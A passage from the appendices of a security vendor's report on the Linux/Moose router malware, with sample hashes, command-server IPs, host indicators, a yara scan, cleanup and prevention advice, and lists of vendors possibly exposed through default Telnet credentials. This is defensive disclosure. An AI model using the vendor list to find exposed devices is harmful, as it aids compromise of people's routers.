is unfortunate that the security of embedded devices isn’t taken more\nseriously by vendors. With the increasing connectivity and proliferation of Linux-based devices,\nsomething will need to be done in that area. We hope that this publication will help vendors\nbetter understand how the malicious actors are targeting their devices.\n\nAs knowledgeable IT people, most of us already check if patches are installed or if anti-virus\nsoftware is updated and operating when we visit friends and relatives. With all the embedded\nthreats out there, we will need to add a quick check of their router to that to-do list. Consider\ncontributing to our potentially targeted vendor list if you find anything.\n\nUnfortunately, this type of animal is far from extinct.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### APPENDIX A: MALWARE SAMPLES\n\nHere are the SHA1 hashes, architecture and malware version of the files we’ve encountered:\n\n\nTable 17. Malware Samples\n\n\nFile Hash Architecture/ABI Version\n\n[10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451](https://www.virustotal.com/latest-scan/10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451) ARM GNU EABI 20\n\n[095ee85aa648de4e557fc243de17d4f00ab2091f](https://www.virustotal.com/latest-scan/095ee85aa648de4e557fc243de17d4f00ab2091f) ARM GNU EABI 20\n\n[bfc2a99450977dc7ba2ec0879fb17c612e248ece](https://www.virustotal.com/latest-scan/bfc2a99450977dc7ba2ec0879fb17c612e248ece) MIPS MIPS32 28\n\n[54041ce90b04698465b866ed169ddf4a269e1e76](https://www.virustotal.com/latest-scan/54041ce90b04698465b866ed169ddf4a269e1e76) MIPS MIPS32 LSB 28\n\n[d648c405507ad62ddb3faa1dd37f659f3676cacf](https://www.virustotal.com/latest-scan/d648c405507ad62ddb3faa1dd37f659f3676cacf) ARM EABI5 28\n\n[85c3439b6773241d11cda78f0ecfea4c07e55fd2](https://www.virustotal.com/latest-scan/85c3439b6773241d11cda78f0ecfea4c07e55fd2) ARM EABI5 28\n\n[216014dba6f1a636c44530fbce06c598d3cf7fa1](https://www.virustotal.com/latest-scan/216014dba6f1a636c44530fbce06c598d3cf7fa1) ARM EABI5 29\n\n[4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757](https://www.virustotal.com/latest-scan/4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757) MIPS MIPS32 29\n\n[dd7e8211336aa02851f6c67690e2301b9c84bb26](https://www.virustotal.com/latest-scan/dd7e8211336aa02851f6c67690e2301b9c84bb26) MIPS MIPS32 31\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### APPENDIX B: INDICATORS OF COMPROMISE (IOCS)\n\n###### Network-based Indicators\n\n Traffic patterns\n\nTraffic from infected device to these IP:ports combinations using TCP\n\n```\n77.247.177.36:81\n93.190.140.221:80\n85.159.237.107:81\n85.159.237.108:81\n77.247.177.87:81\n\n```\n\nTraffic from these IP addresses (the whitelist) going to infected device on TCP port 10073\n\n```\n27.124.41.11\n27.124.41.31\n27.124.41.31\n27.124.41.33\n27.124.41.33\n27.124.41.52\n27.124.41.52\n42.119.173.138\n77.247.177.31\n77.247.177.36\n77.247.178.177\n79.176.26.142\n82.146.63.15\n85.159.237.107\n85.159.237.108\n85.159.237.111\n85.159.237.111\n93.190.139.123\n93.190.139.147\n93.190.140.221\n93.190.142.113\n93.190.143.60\n103.238.216.21\n103.238.216.216\n103.238.216.217\n103.238.216.218\n103.238.216.22\n103.238.216.23\n\n```\n```\n103.238.216.24\n103.238.216.25\n103.238.216.26\n103.238.216.28\n103.238.216.29\n103.238.216.30\n103.238.216.31\n109.201.148.136\n109.201.148.201\n109.201.148.241\n109.236.86.18\n109.236.89.208\n192.126.184.234\n207.244.67.193\n217.23.12.124\n217.23.2.249\n217.23.2.251\n217.23.2.252\n217.23.2.253\n217.23.2.30\n217.23.2.47\n217.23.2.48\n217.23.2.49\n217.23.2.52\n217.23.2.79\n217.23.7.133\n217.23.7.211\n\n```\n\n###### Host-based Indicators\n\n- The presence of a binary named elan2\n\n- Process elan2 running\n\n- A process listening on 0.0.0.0:10073\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThis last indicator can be verified using netstat -anp. Depending on system configuration\nthe -p flag might not be available. If it’s not, then you can look for lsof or try manually correlating\n[the content of /proc/net/tcp/ with /proc/<pid>/fd as explained here.](http://serverfault.com/questions/219984/busybox-netstat-no-p)\n\n###### Detection (yara)\n\nIn order to identify if a file or a set of files is the Linux/Moose threat you can use the popular yara tool.\n\n[Using the linux-moose.yar Yara rule available from our github repository you can recursively crawl](https://github.com/eset/malware-ioc/tree/master/moose/)\na directory for Linux/Moose with:\n\n```\nyara -r linux-moose.yar directory/\n\n```\n\nIf the command yields no output then no files were identified to be Linux/Moose. Otherwise\nidentified filenames are printed.\n\nFurther modifications made by the malware author to evade detection will impact the usefulness\nof this Yara rule over time.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### APPENDIX C: CLEANING\n\nReboot the affected device then change its password as soon as possible. Keep in mind, however,\nthat the compromised system was accessible via credentials that the operators knew, that they\nwere aware of its IP address and they had means to access its interactive console. They might have\n[had manual access, which means that further infection is possible, including permanent firmware](http://www.heise.de/ct/artikel/Aufstand-der-Router-1960334.html)\n[modifications (the link is in German). A factory reset, firmware update or reinstall and password](http://www.heise.de/ct/artikel/Aufstand-der-Router-1960334.html)\nchange is probably best.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### APPENDIX D: PREVENTION\n\nChange default passwords on network equipment even if it is not reachable from the Internet.\nDisable Telnet login and use SSH where possible.\n\nMake sure that your router is not accessible from the Internet on ports 22 (SSH), 23 (Telnet), 80 (HTTP)\nand 443 (HTTPS). If you are unsure about how to perform this test, when you are at home,\n[use the \"common ports\" scan from the ShieldsUP service from GRC.com. Make sure that](https://www.grc.com/shieldsup)\nthe above mentioned ports receive a Stealth or Closed status.\n\nRunning the latest firmware available from your embedded device vendor is also recommended.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### APPENDIX E: POTENTIALLY TARGETED VENDORS\n\n**Note** [To obtain the latest version of this list check our malware-research github page](https://github.com/eset/malware-research/tree/master/moose/)\n\nWe have cross-referenced the list of usernames and passwords that Moose uses in order to spread\nwith a list of vendors known to have these as default credentials and confirmed that some of their\nproducts have Telnet access enabled. Here is the list of potentially targeted vendors we’ve come\nup using this methodology:\n\nNetwork equipment vendors\n\n3Com, Alcatel-Lucent, Allied Telesis, Avaya, Belkin, Brocade, Buffalo, Celerity, Cisco,\nD-link, Enterasys, Hewlett-Packard, Huawei, Linksys, Mikrotik, Netgear, Meridian, Nortel,\nSpeedStream, Thomson, TP-Link, Zhone, ZyXEL\n\nAppliances vendors\n\nAPC, Brother, Konica/Minolta, Kyocera, Microplex, Ricoh, Toshiba, Xerox\n\nInternet of Things vendors\n\nHik Vision, Leviton\n\nKeep in mind that this is a list of potentially targeted vendors. Current Moose versions need some\nUnix-type shell access in order to infect a machine where it successfully logged in. On some devices\nthis type of access is hidden behind another set of credentials or tech-support secret passwords.\nMoose doesn’t target these environments. Since we don’t have access to the hardware for testing\nwe couldn’t validate this aspect in the above lists.\n\n[If you have access to any of this hardware please let us know:](mailto:github%40eset.com?subject=Linux/Moose)\n\n- Is Telnet enabled by default?\n\n- Can you login with the default credentials via Telnet?\n\n- What make and model do you have?\n\n- What happens if you type in sh and then Enter on the default prompt?\n\nIf the credentials can be used via Telnet to login, if Telnet is enabled by default and if a shell access\ncan be obtained by typing sh in the device’s prompt, then these are very good indicators that a device\ncould be infected by Linux/Moose.\n\nThe last list below contains vendors that were correlated using the default credentials list\nas previously mentioned but that we were not able to gather information about if they had Telnet\naccess enabled or not.\n\nEricsson, F5 Networks, Fortinet, Siemens, LSI Corporation, Maxim Integrated, Accelerated\nNetwork, Quantum, Advantek, Airtel, AirTies, Radware, Ubee Interactive, AOC, Applied\nInnovations, Arescom, ARtem, Asante, Ascend, ATL, Atlantis, AVM, Avocent, Axis, Aztech, Bay\nNetworks, Bintec, BMC, Broadlogic, Canyon, Cellit, Ciphertrust, CNet, Compaq, Comtrend,\nConceptronic, Conexant, Corecess, CTC Union, Cyclades, Davox, Demarc, Digicom, Draytek,\nDynalink, E-Con, Efficient, Everfocus, Flowpoint, Gericom, IBM, iDirect, Inchon, Infacta,\nInfoblox, INOVA, Interbase, Intermec, Intracom, JD Edwards, Kasda, KTI, Lantronix, Laxo, LG,\nLivingston, Marconi, McAfee, McData, Mentec, Micronet, Milan, Motorola, Mro software,\nNetopia, Netport, Netscreen, Netstar, Niksun, Nokia, NOMADIX, Olitec(trendchip),\nOpenConnect, Osicom, Overland, Ovislink, Pansonic, Phoenix, Pirelli, Planet, Ptcl, QLogic,\nQuintum Technologies, RM, RoamAbout, Sagem, Samsung, Server TechnologyPower, Sharp,\nSignamax, Siips, Silex Technology, Simple Smdr, Sitecom, Smartswitch, SMC, Sonic-X, Spectra\nLogic, SpeedXess, Sphairon, SSA, Stratacom, Swissvoice, Symbol, System/32, Tandem, Telewell,\nTelindus, Tellabs, Topsec, Troy, TVT System, U.S. Robotics, Unisys, VASCO, VxWorks, Wang,\nWeidmüeller, Westell, X-Micro, xd, Xylan, Xyplex, Zebra, ZTE\n\nIf you know that a particular vendor make and model that could be affected please contact us and\ncontact them.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/38tsu5p4cc9kevuiiaxrptw3wrgksguk",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.05.26.LinuxMoose/Dissecting-LinuxMoose.pdf",
        "http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf",
        "https://web-assets.esetstatic.com/wls/2015/05/Dissecting-LinuxMoose.pdf"
    ],
    "report_names": [
        "Dissecting-LinuxMoose",
        "Dissecting-LinuxMoose.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041630,
    "ts_creation_date": 1432039936,
    "ts_modification_date": 1432039942,
    "files": {
        "pdf": "https://archive.orkl.eu/198195bf91a009bdf666d630230d86b7b1d60bb9.pdf",
        "text": "https://archive.orkl.eu/198195bf91a009bdf666d630230d86b7b1d60bb9.txt",
        "img": "https://archive.orkl.eu/198195bf91a009bdf666d630230d86b7b1d60bb9.jpg"
    }
}